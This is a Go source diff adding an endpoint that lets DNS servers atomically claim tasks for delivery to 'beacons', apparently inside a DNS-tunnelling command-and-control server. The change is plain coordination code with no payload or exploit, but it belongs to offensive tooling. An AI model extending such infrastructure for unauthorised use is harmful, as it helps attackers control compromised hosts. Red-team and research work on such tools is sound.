@@ -1416,6 +1416,49 @@ func (api *APIServer) handleGetTaskStatusesForDNSServer(w http.ResponseWriter, r
 	json.NewEncoder(w).Encode(tasks)
 }
 
+// handleMarkTaskDelivered marks a task as delivered by a DNS server
+// This is called when a DNS server delivers a task to a beacon (atomically claims it)
+func (api *APIServer) handleMarkTaskDelivered(w http.ResponseWriter, r *http.Request) {
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+
+	var req struct {
+		TaskID string `json:"task_id"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	if req.TaskID == "" {
+		api.sendError(w, http.StatusBadRequest, "task_id is required")
+		return
+	}
+
+	// Atomically mark task as delivered
+	claimed, err := api.db.MarkTaskDelivered(req.TaskID, dnsServerID)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to mark task as delivered")
+		if api.config.Debug {
+			fmt.Printf("[API] Error marking task delivered: %v\n", err)
+		}
+		return
+	}
+
+	if api.config.Debug {
+		if claimed {
+			fmt.Printf("[API] Task %s delivered by DNS server %s\n", req.TaskID, dnsServerID)
+		} else {
+			fmt.Printf("[API] Task %s already delivered by another DNS server\n", req.TaskID)
+		}
+	}
+
+	api.sendSuccess(w, "task marked as delivered", map[string]interface{}{
+		"task_id": req.TaskID,
+		"claimed": claimed,
+	})
+}
+
 // handleSubmitResult processes a task result from a DNS server
 // Handles both single-chunk and multi-chunk results from distributed DNS servers
 func (api *APIServer) handleSubmitResult(w http.ResponseWriter, r *http.Request) {
@@ -2165,6 +2208,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	dnsRouter.HandleFunc("/result", api.handleSubmitResult).Methods("POST")
 	dnsRouter.HandleFunc("/progress", api.handleSubmitProgress).Methods("POST")
 	dnsRouter.HandleFunc("/tasks", api.handleGetTasksForDNSServer).Methods("GET")
+	dnsRouter.HandleFunc("/tasks/delivered", api.handleMarkTaskDelivered).Methods("POST")
 	dnsRouter.HandleFunc("/task-statuses", api.handleGetTaskStatusesForDNSServer).Methods("GET")
 	dnsRouter.HandleFunc("/beacons", api.handleGetBeaconsForDNSServer).Methods("GET")
 
